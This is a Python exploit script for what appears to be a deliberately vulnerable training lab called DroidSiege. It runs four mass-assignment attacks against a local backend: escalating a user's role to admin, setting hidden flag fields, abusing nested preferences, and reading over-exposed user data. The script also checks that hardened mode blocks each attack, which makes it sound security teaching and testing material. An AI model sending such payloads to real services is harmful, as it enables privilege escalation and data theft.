#!/usr/bin/env python3
"""DroidSiege — backend/massassign exploit script (all four tiers, vuln + hardened).

Usage: python3 massassign_attacks.py [base_url]
Default base: http://10.0.2.2:8080 (emulator -> host loopback). For hardened
verification start the backend with SECURE_MODE=on and re-run: every exploit
must FAIL (401/403/429, no flag).
"""
import hashlib, json, sys, urllib.request

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://10.0.2.2:8080").rstrip("/")

def call(method, path, token=None, body=None):
    req = urllib.request.Request(BASE + path, method=method)
    if token:
        req.add_header("Authorization", "Bearer " + token)
    data = None
    if body is not None:
        data = json.dumps(body).encode()
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, data=data) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()

def login(u, p):
    status, body = call("POST", "/api/auth/login", body={"username": u, "password": p})
    assert status == 200, f"login failed: {{status}} {{body}}"
    return json.loads(body)["token"]


def main():
    alice = login("alice", "hunter2")

    print("== L1: bind role -> read admin metrics ==")
    call("PUT", "/api/profile", alice, {"fullname": "Alice Lab", "role": "admin"})
    print(call("GET", "/api/admin/metrics", alice))

    print("== L2: hidden flagAccess opens the premium vault (and never L3's secret) ==")
    call("PUT", "/api/profile", alice, {"flagAccess": True})
    print(call("GET", "/api/profile", alice))

    print("== L3: nested prefs.vaultSync opens the secure note (and never L2's flag) ==")
    print(call("POST", "/api/account", alice,
               {"fullname": "Alice Lab", "prefs": {"vaultSync": True}}))

    print("== L4: the listing over-exposes internal fields to any caller ==")
    print(call("GET", "/api/users", alice))

if __name__ == "__main__":
    main()
